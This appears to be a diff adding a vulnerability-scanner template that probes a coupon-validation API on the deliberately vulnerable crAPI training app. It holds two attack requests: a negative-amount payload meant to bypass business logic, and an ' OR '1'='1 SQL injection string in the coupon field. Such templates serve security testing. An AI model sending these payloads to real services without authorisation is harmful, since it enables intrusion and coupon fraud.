@@ -1,0 +1,49 @@
+id: coupon-server-error-injection
+info:
+  name: Coupon 驗證 - 伺服器錯誤（潛在注入）
+  author: redsaas
+  severity: medium
+  description: |
+    POST /community/api/v2/coupon/validate-coupon 回傳 500，
+    伺服器未正確處理輸入驗證，可能存在 SQL Injection 或 NoSQL Injection。
+    傳入負數金額會觸發 500，可能導致業務邏輯繞過。
+  tags: api,injection,business-logic,owasp-api3,crapi
+
+http:
+  - raw:
+      - |
+        POST /community/api/v2/coupon/validate-coupon HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{token}}
+        Content-Type: application/json
+
+        {"coupon_code":"TRAC075","amount":-100}
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Traceback"
+          - "Exception"
+          - "SQL"
+          - "error"
+        condition: or
+
+  - raw:
+      - |
+        POST /community/api/v2/coupon/validate-coupon HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{token}}
+        Content-Type: application/json
+
+        {"coupon_code":"' OR '1'='1","amount":10}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
